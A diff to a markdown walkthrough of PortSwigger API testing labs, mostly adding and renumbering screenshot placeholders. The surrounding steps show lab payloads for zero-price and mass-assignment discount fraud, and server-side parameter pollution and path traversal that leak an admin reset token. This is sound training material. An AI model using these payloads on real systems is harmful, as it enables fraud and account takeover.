@@ -57,18 +57,22 @@ Applications often expose machine-readable or interactive documentation that rev
 Content-Type: application/json
 ```
 
+> **Picture goes here (#4).** Capture this request/response or command step in Burp/terminal. Key line: `Content-Type: application/json`.
+> _Save as_ `images/portswigger-api-testing-labs/4.png` _then replace this block with_ `![Lab 2 — Finding and exploiting an unused API endpoint](/images/portswigger-api-testing-labs/4.png)`_._
+
+
 7. Send an empty JSON object `{}` → error that `price` is missing.
 8. Send `{"price":0}`.
 9. Reload the product page — the price is now `$0.00`. Add it to the basket and place the order.
 
-> **Picture goes here (#4).** The `PATCH /api/products/1/price` request setting `{"price":0}` and the free checkout.
-> _Save as_ `images/portswigger-api-testing-labs/4.png` _then replace this block with_ `![Lab 2 — Finding and exploiting an unused API endpoint](/images/portswigger-api-testing-labs/4.png)`_._
+> **Picture goes here (#5).** The `PATCH /api/products/1/price` request setting `{"price":0}` and the free checkout.
+> _Save as_ `images/portswigger-api-testing-labs/5.png` _then replace this block with_ `![Lab 2 — Finding and exploiting an unused API endpoint](/images/portswigger-api-testing-labs/5.png)`_._
 
 **Lesson:** enumerate HTTP methods with `OPTIONS`/`OPTIONS *`, and never rely on the UI to define what a resource supports. Price/write endpoints must enforce authorization and validation server-side.
 
 ## Lab 3 — Exploiting a mass assignment vulnerability
-> **Picture goes here (#5).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `{`.
-> _Save as_ `images/portswigger-api-testing-labs/5.png` _then replace this block with_ `![Lab 3 — Exploiting a mass assignment vulnerability](/images/portswigger-api-testing-labs/5.png)`_._
+> **Picture goes here (#6).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `{`.
+> _Save as_ `images/portswigger-api-testing-labs/6.png` _then replace this block with_ `![Lab 3 — Exploiting a mass assignment vulnerability](/images/portswigger-api-testing-labs/6.png)`_._
 
 
 **Difficulty:** Practitioner
@@ -97,18 +101,22 @@ Mass assignment happens when the server binds all submitted JSON fields to an ob
 }
 ```
 
+> **Picture goes here (#7).** Capture this request/response or command step in Burp/terminal. Key line: `{`.
+> _Save as_ `images/portswigger-api-testing-labs/7.png` _then replace this block with_ `![Lab 3 — Exploiting a mass assignment vulnerability](/images/portswigger-api-testing-labs/7.png)`_._
+
+
 5. Send it — no error, so the field is accepted.
 6. Set `percentage` to the string `"x"` → a validation error, proving the value is processed.
 7. Set `percentage` to `100` and send → the order succeeds for free.
 
-> **Picture goes here (#6).** The mass-assigned `chosen_discount` request and the successful discount.
-> _Save as_ `images/portswigger-api-testing-labs/6.png` _then replace this block with_ `![Lab 3 — Exploiting a mass assignment vulnerability](/images/portswigger-api-testing-labs/6.png)`_._
+> **Picture goes here (#8).** The mass-assigned `chosen_discount` request and the successful discount.
+> _Save as_ `images/portswigger-api-testing-labs/8.png` _then replace this block with_ `![Lab 3 — Exploiting a mass assignment vulnerability](/images/portswigger-api-testing-labs/8.png)`_._
 
 **Lesson:** never bind request JSON directly onto internal objects; use explicit DTOs/allow-lists of writable fields.
 
 ## Lab 4 — Exploiting server-side parameter pollution in a query string
-> **Picture goes here (#7).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `username=administrator               → normal response`.
-> _Save as_ `images/portswigger-api-testing-labs/7.png` _then replace this block with_ `![Lab 4 — Exploiting server-side parameter pollution in a query string](/images/portswigger-api-testing-labs/7.png)`_._
+> **Picture goes here (#9).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `username=administrator               → normal response`.
+> _Save as_ `images/portswigger-api-testing-labs/9.png` _then replace this block with_ `![Lab 4 — Exploiting server-side parameter pollution in a query string](/images/portswigger-api-testing-labs/9.png)`_._
 
 
 **Difficulty:** Practitioner
@@ -126,6 +134,10 @@ username=administrator%23            → "Field not specified"          (the # t
 username=administrator%26field=x%23  → "Invalid field"
 ```
 
+> **Picture goes here (#10).** Capture this request/response or command step in Burp/terminal. Key line: `username=administrator               → normal response`.
+> _Save as_ `images/portswigger-api-testing-labs/10.png` _then replace this block with_ `![Lab 4 — Exploiting server-side parameter pollution in a query string](/images/portswigger-api-testing-labs/10.png)`_._
+
+
 The internal request is something like `GET /internal/v1/users?username=<input>&field=<field>`. We can override `field`.
 
 **Finding a valid field value** — send to Intruder with a payload position on the value of `field` and use the built-in **Server-side variable names** list:
@@ -134,11 +146,19 @@ The internal request is something like `GET /internal/v1/users?username=<input>&
 username=administrator%26field=§x§%23
 ```
 
+> **Picture goes here (#11).** Capture this request/response or command step in Burp/terminal. Key line: `username=administrator%26field=§x§%23`.
+> _Save as_ `images/portswigger-api-testing-labs/11.png` _then replace this block with_ `![Lab 4 — Exploiting server-side parameter pollution in a query string](/images/portswigger-api-testing-labs/11.png)`_._
+
+
 Both `username` and `email` return 200. Then request the reset token field:
 
 ```text
 username=administrator%26field=reset_token%23
 ```
+
+> **Picture goes here (#12).** Capture this request/response or command step in Burp/terminal. Key line: `username=administrator%26field=reset_token%23`.
+> _Save as_ `images/portswigger-api-testing-labs/12.png` _then replace this block with_ `![Lab 4 — Exploiting server-side parameter pollution in a query string](/images/portswigger-api-testing-labs/12.png)`_._
+
 
 The response now contains the administrator's **reset token**. Browse to the reset endpoint from `/static/js/forgotPassword.js`:
 
@@ -146,14 +166,18 @@ The response now contains the administrator's **reset token**. Browse to the res
 /forgot-password?reset_token=123456789
 ```
 
+> **Picture goes here (#13).** Capture this request/response or command step in Burp/terminal. Key line: `/forgot-password?reset_token=123456789`.
+> _Save as_ `images/portswigger-api-testing-labs/13.png` _then replace this block with_ `![Lab 4 — Exploiting server-side parameter pollution in a query string](/images/portswigger-api-testing-labs/13.png)`_._
+
+
 Set a new password, log in as administrator, and delete `carlos`.
 
-> **Picture goes here (#8).** The `field=reset_token` response leaking the admin token and the password reset page.
-> _Save as_ `images/portswigger-api-testing-labs/8.png` _then replace this block with_ `![Lab 4 — Exploiting server-side parameter pollution in a query string](/images/portswigger-api-testing-labs/8.png)`_._
+> **Picture goes here (#14).** The `field=reset_token` response leaking the admin token and the password reset page.
+> _Save as_ `images/portswigger-api-testing-labs/14.png` _then replace this block with_ `![Lab 4 — Exploiting server-side parameter pollution in a query string](/images/portswigger-api-testing-labs/14.png)`_._
 
 ## Lab 5 — Exploiting server-side parameter pollution in a REST URL
-> **Picture goes here (#9).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `username=administrator#      → "Invalid route"        (# truncates the path)`.
-> _Save as_ `images/portswigger-api-testing-labs/9.png` _then replace this block with_ `![Lab 5 — Exploiting server-side parameter pollution in a REST URL](/images/portswigger-api-testing-labs/9.png)`_._
+> **Picture goes here (#15).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `username=administrator#      → "Invalid route"        (# truncates the path)`.
+> _Save as_ `images/portswigger-api-testing-labs/15.png` _then replace this block with_ `![Lab 5 — Exploiting server-side parameter pollution in a REST URL](/images/portswigger-api-testing-labs/15.png)`_._
 
 
 **Difficulty:** Expert
@@ -170,6 +194,10 @@ username=./administrator     → normal response        (same path)
 username=../administrator    → "Invalid route"        (parent path)
 ```
 
+> **Picture goes here (#16).** Capture this request/response or command step in Burp/terminal. Key line: `username=administrator#      → "Invalid route"        (# truncates the path)`.
+> _Save as_ `images/portswigger-api-testing-labs/16.png` _then replace this block with_ `![Lab 5 — Exploiting server-side parameter pollution in a REST URL](/images/portswigger-api-testing-labs/16.png)`_._
+
+
 **Escaping the API root to read its definition**
 
 ```text
@@ -178,11 +206,19 @@ username=../../../../%23                                  → "Not found" (outsi
 username=../../../../openapi.json%23                      → leaks the API definition
 ```
 
+> **Picture goes here (#17).** Capture this request/response or command step in Burp/terminal. Key line: `username=../%23`.
+> _Save as_ `images/portswigger-api-testing-labs/17.png` _then replace this block with_ `![Lab 5 — Exploiting server-side parameter pollution in a REST URL](/images/portswigger-api-testing-labs/17.png)`_._
+
+
 The definition reveals:
 
 ```text
 /api/internal/v1/users/{username}/field/{field}
 ```
+
+> **Picture goes here (#18).** Capture this request/response or command step in Burp/terminal. Key line: `/api/internal/v1/users/{username}/field/{field}`.
+> _Save as_ `images/portswigger-api-testing-labs/18.png` _then replace this block with_ `![Lab 5 — Exploiting server-side parameter pollution in a REST URL](/images/portswigger-api-testing-labs/18.png)`_._
+
 
 **Injecting the `field` path parameter**
 
@@ -191,11 +227,19 @@ username=administrator/field/foo%23                → error (only "email" suppo
 username=administrator/field/email%23              → normal response
 ```
 
+> **Picture goes here (#19).** Capture this request/response or command step in Burp/terminal. Key line: `username=administrator/field/foo%23                → error (only "email" supported)`.
+> _Save as_ `images/portswigger-api-testing-labs/19.png` _then replace this block with_ `![Lab 5 — Exploiting server-side parameter pollution in a REST URL](/images/portswigger-api-testing-labs/19.png)`_._
+
+
 `passwordResetToken` is rejected because the application pins an older API **version**:
 
 ```text
 username=administrator/field/passwordResetToken%23 → error
 ```
+
+> **Picture goes here (#20).** Capture this request/response or command step in Burp/terminal. Key line: `username=administrator/field/passwordResetToken%23 → error`.
+> _Save as_ `images/portswigger-api-testing-labs/20.png` _then replace this block with_ `![Lab 5 — Exploiting server-side parameter pollution in a REST URL](/images/portswigger-api-testing-labs/20.png)`_._
+
 
 Force the API version from the path:
 
@@ -203,16 +247,24 @@ Force the API version from the path:
 username=../../v1/users/administrator/field/passwordResetToken%23
 ```
 
+> **Picture goes here (#21).** Capture this request/response or command step in Burp/terminal. Key line: `username=../../v1/users/administrator/field/passwordResetToken%23`.
+> _Save as_ `images/portswigger-api-testing-labs/21.png` _then replace this block with_ `![Lab 5 — Exploiting server-side parameter pollution in a REST URL](/images/portswigger-api-testing-labs/21.png)`_._
+
+
 This returns the reset token. Use the JS-identified endpoint:
 
 ```text
 /forgot-password?passwordResetToken=<token>
 ```
 
+> **Picture goes here (#22).** Capture this request/response or command step in Burp/terminal. Key line: `/forgot-password?passwordResetToken=<token>`.
+> _Save as_ `images/portswigger-api-testing-labs/22.png` _then replace this block with_ `![Lab 5 — Exploiting server-side parameter pollution in a REST URL](/images/portswigger-api-testing-labs/22.png)`_._
+
+
 Set a new admin password, log in, and delete `carlos`.
 
-> **Picture goes here (#10).** The `openapi.json` leak and the version-overridden `passwordResetToken` response.
-> _Save as_ `images/portswigger-api-testing-labs/10.png` _then replace this block with_ `![Lab 5 — Exploiting server-side parameter pollution in a REST URL](/images/portswigger-api-testing-labs/10.png)`_._
+> **Picture goes here (#23).** The `openapi.json` leak and the version-overridden `passwordResetToken` response.
+> _Save as_ `images/portswigger-api-testing-labs/23.png` _then replace this block with_ `![Lab 5 — Exploiting server-side parameter pollution in a REST URL](/images/portswigger-api-testing-labs/23.png)`_._
 
 ## API testing cheat sheet
 
